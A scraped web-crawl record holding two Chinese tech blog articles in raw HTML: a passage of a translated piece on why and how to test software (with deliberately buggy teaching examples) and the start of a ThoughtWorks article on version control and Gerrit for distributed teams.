class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef test_add():\r\n    assert add(2, 2) == 5</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ecaef70411012138-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ecaef70411012138-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ecaef70411012138-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">test_add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ecaef70411012138-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">assert</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>我会说，是的，那就是一个测试。从函数名上可以看出来。这个测试证明了函数add() 做了什么：对两个数字做加法，然后将结果返回给我们。</p>\n<p>你一定注意到了，这个测试是错误的。幸运的是，我们的开发过程有另一步骤：代码审查。亲爱的读者，你可以作为一个代码审查者并告诉我，我的代码是错误的，2加2是4，不是5。</p>\n<p>代码审查是一种测试方法吗？如果你试图验证你的代码符合规范，那么这就是一种测试。你大脑中有算术规范（”2 + 2 = 4″），你就会检查你的代码是否符合这个规范。</p>\n<p><strong>让我们把代码审查和自动化单元测试都做分别作为一种测试方法。</strong>尽管他们都是测试，他们也非常不同。他们之间的主要区别是什么？</p>\n<p>测试的一种方法是自动化的，另一种是由人类完成的。</p>\n<p>自动化测试是连续的和可重复的，你可以这么写：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ecaef7c116915055\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef test_add_twice():\r\n    for i in range(10000000):\r\n        assert add(i, i) == 2 * i</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ecaef7c116915055-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ecaef7c116915055-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ecaef7c116915055-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ecaef7c116915055-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">test_add_twice</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ecaef7c116915055-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">10000000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594b05ecaef7c116915055-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">assert</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>计算机将会每次运行完全相同的代码，该代码将会确保函数 add() 对于这些特定的输入返回特定的输出。人在手动验证一千万种不同的计算时会遇到一些困难：无聊、分心、错误、迟缓。</p>\n<p>另一方面，人类在阅读这个代码时，会告诉你这是bug：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ecaef81852590309\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef add(a, b):\r\n    return a + b + 1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ecaef81852590309-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ecaef81852590309-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ecaef81852590309-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ecaef81852590309-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>计算机所做的事情，无论是好是坏，人类都能明白他的意义。只有人类才知道软件的意义是什么。</p>\n<p>现在我们可以按照使用的方法来对测试进行分类<strong>：人类测试意义，自动化测试确保一致性。</strong></p>\n<h2>你为什么要测试软件？</h2>\n<p>接下来，让我们考虑测试目标。</p>\n<p><strong>测试软件的第一个可能的目标就是确保它符合规范。</strong>这个目标是大多数程序员在讨论测试时想到的：它涵盖了单元测试和手工测试，它也包括代码审查。你的软件具有某些必须的功能、规范，你想确保它在现在和未来也确实是这样的。</p>\n<p>一些需求是高层次的：一个在线商店想要顾客可以订购他们添加到购物车的产品。其他需求是低层次的实现细节，只有程序员感兴趣。你可能想要函数 verify_creditcard() 接收信用卡号码作为字符串，然后如果信用卡是无效的，抛出一个 InvalidCreditCard 异常。</p>\n<p>所有的这些需求都是规范，他可以被写的非常详细，也可以是头脑中的一个概念（如 2 + 2 等于 4 ）。无论如何，你测试你的软件是为了确保它做了它应该做的事。</p>\n<p><strong>然而，有时测试也可以有不同的目标。</strong>在 Eric Ries 的书《精益创业》中， 他提到编写软件后却发现没有人真正想用它的问题。如果没有人使用你的软件，花费了大量的时间去测试，确保你的软件满足规范就是浪费时间。</p>\n<p>Ries 认为你首先应该搞清楚一个产品是否会成功，通过测试他称为的“最低可行产品”是否拥有潜在的用户和客户。这是一个与众不同的测试形式：它不是验证你的软件是否满足规范，而是学习你以前不知道的东西。</p>\n<p><strong>软件测试第二个可能的目标就是为了获得知识。</strong>让我随着这个目标看一下另一种测试形式。“A/B测试”就是你使用两个变量，然后看哪个变量产生更好的结果。或许你正在测试重新设计的网站：你给 90% 的访客展现你目前的设计，10% 的访客展现你的新设计，然后看哪种会让你的产品有更多的用户注册。</p>\n<p>注意，你有两套规范，并且已经实现了他们。测试的要点就是找到哪种规范更好，学习一些新的东西，而不是验证实现是否符合规范。</p>\n<p>现在我们已经知道为什么你需要做测试：<strong>要么验证你的实现符合规范，要么获得新的知识。</strong></p>\n<h2>你应该如何测试软件？</h2>\n<p>结合我们提出的那两个目标（获得新知识和满足规范）和两种测试方法（手工测试和自动化测试），你会得到四种不同的测试形式，每种都会有更详细的测试目标。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/03/e037c613b8d1aafc714d7b49c878b13a.png\"><img class=\"aligncenter wp-image-63230 size-full\" src=\"http://jbcdn2.b0.upaiyun.com/2017/03/e037c613b8d1aafc714d7b49c878b13a.png\" alt=\"QQ图片20170408100459\" width=\"653\" height=\"268\"></a></p>\n<p>对于你特定的需求和情况，你必须选择一种合适的测试方式。让我们逐个介绍这四种测试类型，看看每种测试类型应该在什么情况下使用。</p>\n<h3>理解用户</h3>\n<ul>\n<li>用户会购买你的产品吗？</li>\n<li>一个设计的改变会带来有更多的注册吗？</li>\n<li>用户会理解你的软件是如何工作的吗？</li>\n</ul>\n<p>这些问题都无法通过对比你的软件是否满足规范来得到回答。相反，你需要经验知识：你需要观察当你的软件展现给用户时，用户真正做了什么操作。</p>\n<p>相关的测试技术包括：</p>\n<ul>\n<li>可用性测试</li>\n<li>最低可行产品测试（《精益创业》）</li>\n<li>A/B测试</li>\n</ul>\n<h3>理解运行时行为</h3>\n<ul>\n<li>你的软件在负载下的表现如何？</li>\n<li>你的软件有资源竞争吗？</li>\n<li>当有非法输入时，你的软件是否会崩溃？</li>\n</ul>\n<p>这些问题不能总是通过比较你的软件是否符合规范来回答。一旦你的软件足够复杂，你无法完全理解或者预测它的回应。你需要观察它的实际运行来理解其行为。</p>\n<p>相关的测试技术包括：</p>\n<ul>\n<li>压力测试和浸泡测试</li>\n<li>从产品日志中收集异常及跟踪信息</li>\n</ul>\n<h3>功能的正确性</h3>\n<ul>\n<li>你的软件是否真正符合规范？</li>\n<li>你的软件是否做了它应该做的事？</li>\n</ul>\n<p>很容易可以看到，自动化测试可以证明这些，但是请记住检查2+2等于5的单元测试。在更基本的层面上，软件可以在技术上满足规范，但是不能达到规范的目标。只有我们理解规范背后的含义，然后才能确定软件是否达到了目标。</p>\n<p>相关的测试技术包括：</p>\n<ul>\n<li>手动用户界面测试（如：QA人员使用您的网站）</li>\n<li>代码审查</li>\n</ul>\n<h3>功能的稳定性</h3>\n<ul>\n<li>对于同样的输入，你的公开接口（API）是否总能返回相同的结果？</li>\n<li>你的代码是否提供了它应该提供的保证？</li>\n</ul>\n<p>人类很不擅长测试这些情况。人类非常容易忽略小的变化：如果一个按钮从“Send Now”改变为“Send now”，你可能根本就不会注意到。相反，如果你的接口从sendNow() 变为 send_now()，或者返回值的类型有轻微变化，你的软件就会崩溃。</p>\n<p>这意味着一个公开接口，尤其是其他软件依赖的接口，为了保证正确性必须要稳定。当你不断更新你的测试时，为改变频繁的私有接口或者代码编写自动化测试，将会导致非常高的维护成本</p>\n<p>相关的测试技术包括：</p>\n<ul>\n<li>单元测试、集成测试和其他类似的自动化接口测试</li>\n<li>自动化用户界面测试（如：网站的Selenium测试）</li>\n<li><span style=\"color: #000000;\">编译器检查和静态检查</span></li>\n</ul>\n<h2>模型的应用</h2>\n<p>那么这一切有什么好处呢？</p>\n<h3>选择如何去测试</h3>\n<p><strong>首先，我们最初的目标：基于你的目标，这个模型可以帮助选择测试形式。</strong></p>\n<p>考虑一个新建立的产品，不确定什么样的人愿意使用这个产品。自动化测试的重点在于确保代码符合规范，因此在搞清楚用户真正的需求之前，编写自动化测试用例可能是浪费时间。</p>\n<p>精益创业（Lean Startup）是一种可行的替代方法，它的目标是找到什么样的产品可以满足用户的需求，它侧重于实验或者尝试。这意味着专注理解用户这个象限。一旦选定了产品，你就可以花费时间在确认“最低可行性”之外的地方，比如投入更多的资源保证软件功能的正确性和稳定性。</p>\n<h3>辨别你是否选择了错误的测试类型</h3>\n<p><strong>第二，当你选择了错误的测试类型时，这个模型可以帮你改变航向。</strong>比如假设编写税收软件（细节源自一个真实案例），他们为他们的web界面编写了Selenium测试，与此同时他们的web界面做了重大的改变。</p>\n<p>即使做了测试，他们的程序依然是有bug的，每次改变界面这些测试用例就不能使用了。测试似乎没有提升质量，但是它浪费了开发者的时间进行维护。他们做错了什么？</p>\n<p>这个问题就是他们的系统实际上有两部分：</p>\n<ol>\n<li>税收引擎相当稳定，税法每年只改变一次。对于用户来说税收引擎中的错误是一个主要问题，对于开发者来说不兼容的接口改变是一个问题。这表明需要稳定的功能测试，比如针对税收计算引擎的单元测试。正确的功能可以通过代码审和查税务会计的反馈来保证。</li>\n<li>基于web的用户界面。UI界面频繁的变更，这表明稳定的功能测试现在还不是目标。现在的目标是功能的正确性，所以UI界面应该进行手工测试（比如：当程序员写代码时进行测试）</li>\n</ol>\n<h3>讨论测试的基础</h3>\n<p>最后，这个模型提供了一个共享的术语，这个术语可以帮助你在广泛的意义和不同的目标下讨论测试。</p>\n<ul>\n<li>可以不必再对手工测试和单元测试哪个更好进行无休止的争论，从这个模型中可以非常清楚的展示出他们之间的差异。</li>\n<li>你还可以与公司的其他部门（如市场营销）讨论测试，这会是一个非常不同的测试视角。</li>\n</ul>\n<h2>总结</h2>\n<p>你为什么要测试你的软件？要么获得知识，要么满足规范。</p>\n<p>你测试软件的方法有哪些？手工测试或者自动化测试。</p>\n<p>你应该如何测试你的软件？根据你特定的情况，选择相关的测试形式，如理解用户、理解运行时行为、功能的稳定性、功能的一致性。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/9d1537dc33c0a291a88e68a8d61b1cd2.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/ac2801b765615f93574f10b0ac15990b.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111293\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111293votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111293\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/2106382253\">Anne90</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/2106382253\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/ee02ba031bee9222a2878fe9565d65a6.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            软件开发测试工程师，关注互联网/软件测试相关        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/2106382253\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/2106382253/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/2106382253/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 10</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/2106382253\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/large/63918611gy1ffytn2l5quj20dc0a0dg9.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/05/31", "praise_nums": 1}
{"tags": "版本控制,IT技术", "front_image_path": "full/5cfcf5e9fbe6da2f72e39223e2bfe60ea4062239.jpg", "title": "大型分布式团队的代码版本管理", "url_object_id": "447fef8e510a600301d54e56d3053b93", "url": "http://blog.jobbole.com/111291/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>介绍这个话题，有两个原因：</p>\n<ol>\n<li>从开始工作到现在，我经历过没有代码版本管理、代码集中式管理，以及现在的分布式管理，我深刻体会到它在软件开发过程中的重要性；</li>\n<li>我在工作中遇到的很多客户都存在对于代码版本管理的各种问题、困惑和不同的需求。</li>\n</ol>\n<p>所以我希望将我在这个方面的经验分享给更多人，希望能帮助更多的团队解决在代码版本控制方面的问题和疑惑。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/0-1.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/0-1.png\" alt=\"\" width=\"492\" height=\"256\"></a></p>\n<p>（图片来自：http://t.cn/RSPnA5t）</p>\n<h3>一、代码版本管理系统的历史</h3>\n<p>代码版本管理系统大致可以分为三个时代：</p>\n<p><strong>第一代：本地式</strong></p>\n<p>这代主要的特点提供本地代码版本控制，比如SCCS(1972)、 PVCS(1985)等。</p>\n<p>这代主要实现了基本的代码版本管理，但缺点是无法让多人同时对一个版本库进行修改。这个也和当时软件规模不够大有关，也没有这样的需求。</p>\n<p><strong>第二代：客户端-服务器式</strong></p>\n<p>这代主要的特点是提供集中式服务器端代码版本控制,比如 CVS(1986), ClearCase(1992), Visual SourceSafe(1994), Perforce(1995), Subversion(2000) 等。</p>\n<p>这代主要是实现了中心服务器端的代码版本管理，特点是可以让多人同时对一个代码版本库进行同步和修改，但缺点也相当明显：</p>\n<ol>\n<li>在无法连接服务器的情况下，无法查看日志以及提交和比较代码版本（慢速网络和远程异地工作的程序员的痛），以及当服务或者网络出现问题的时候很多人员就会无法工作。</li>\n<li>不支持local branch，导致branch创建管理复杂，并且一旦创建就很难修改（快速迭代开发中的程序员的痛）</li>\n<li>由于只有一个中心端服务器，一旦发生灾难性问题，那么所有日志都会丢失，所以需要经常做备份（备份需要不小的成本）</li>\n<li>如果软件代码量过于庞大，一般会出现速度缓慢的情况，因为每次的日志查询、不同版本之间的代码比较和代码提交等操作都需要和服务器通信，造成服务器端的负载过大。</li>\n</ol>\n<p><strong>第三代：分布式</strong></p>\n<p>这代主要的特点是提供分布式代码版本控制,比如Git(2005), Mercurial(2005)等。</p>\n<p>这代结合了第一代和第二代的优点并实现了分布式的代码版本管理。</p>\n<p>这代的优点：分布式管理，在没有和服务器有连接的情况下仍然可以查看日志，提交代码，创建分支；支持local branch，可以快速方便的实现各种分支管理；支持分布式，从而可以实现分块管理，以及负载分流管理。</p>\n<p>缺点是有一定的学习曲线，比如分布方式下的代码同步，local branch的理解与运用，分布式代码管理的理解与运用等。详细的比较可以参考：<a href=\"https://en.wikipedia.org/w/index.php?title=Comparison_of_version_control_software\">这里</a>。</p>\n<h3>二、大型分布式团队</h3>\n<p>曾经有这样一个分布式团队，他们在多个城市都有小分队，并且正在开发一个大型项目，见下图</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/1-2.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/1-2.png\" alt=\"\" width=\"975\" height=\"671\"></a></p>\n<p>他们使用的代码版本管理工具是第二代代码管理工具SVN，管理方案如下：</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/2-1.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/2-1.png\" alt=\"\" width=\"975\" height=\"729\"></a></p>\n<p>但是他们在使用的过程中却遇到了下面这些问题与痛点。</p>\n<p>由于是分布式团队，所以：</p>\n<ul>\n<li>基于团队的代码模块分离困难</li>\n</ul>\n<p>当服务器不可用时：</p>\n<ul>\n<li>不能查看提交记录</li>\n<li>不能比较文件</li>\n<li>不能提交代码</li>\n</ul>\n<p>创建代码分支时：</p>\n<ul>\n<li>分支创建速度慢</li>\n<li>多分支管理困难</li>\n</ul>\n<p>在提交代码时：</p>\n<ul>\n<li>希望有Code Review</li>\n<li>希望有CI Review</li>\n</ul>\n<p>因为代码庞大：</p>\n<ul>\n<li>查看日志慢</li>\n</ul>\n<p>备份代码库的时候：</p>\n<ul>\n<li>需要停机备份</li>\n<li>备份成本高</li>\n</ul>\n<p>针对以上问题，可以使用新一代的分布式的代码版本管理系统来解决，见下图：</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/3-2.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/3-2.png\" alt=\"\" width=\"975\" height=\"679\"></a></p>\n<p>其中每一个团队都有自己独立的代码库，有一个中心库用于同步这些独立的代码库，并且每个库都由团队自己管理和维护。而且代码版本管理系统需要支持轻量分支，代码评审，离线提交，离线查看日志等功能。</p>\n<p>但是由于当前没有一个单一的代码版本管理工具能同时满足以上所有需求，所以很多公司都基于它们开发集成管理系统，比如Gerrit，GitLab，GitHub，BitBucket等。其中的Gerrit由于其开源，免费，以及由Google开发和维护，并管理着Android，OpenStack等大型项目源代码的特点，成为了大型分布式团队优先选择的系统。</p>\n<h3>三、Gerrit</h3>\n<p>Gerrit是由Google开发的，用于管理Google Android项目源代码的一个系统。它是基于Java和Prolog等开发的，支持Git，权限管理，代码评审等综合的一个管理系统。它与GitLab和GitHub最大的不同是它隐藏了代码分库管理的细节，使得开发人员不需要进行fork这样的手工分库和同步操作就可以进行代码开发和提交，节省了开发人员的时间,见下图。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/4-2.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/4-2.png\" alt=\"\" width=\"975\" height=\"671\"></a></p>\n<p>由于Android本身是一个开源项目，所以贡献者非常多，开发团队也遍布多个地方（存在时差），导致“如何保证代码质量”成为一个很大的问题。为此Google在Gerrit中加入了功能强大并且十分严格的代码评审系统。</p>\n<p>首先当代码提交以后并不会直接merge到中心库里面，它会暂时存在一个临时库里面，同时生成一个代码评审记录，并向特定的评审人员发送请求评审的邮件。当评审者在评审代码之后，如果通过就需要在Gerrit系统里面对代码进行打分，如果通过了就可以将代码merge到中心库里面去，如果没有通过，那么这个代码提交就需要被返还给开发者进行修改。</p>\n<p>与此同时它还可以自动触发一次包含本次代码提交的CI构建（前提需要手工预先配置），如果CI自动构建和测试通过，也可以自动在Gerrit系统里面进行打分，可以给最终进行merge的人员进行参考。示意流程见下图。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/5-2.png\"><img 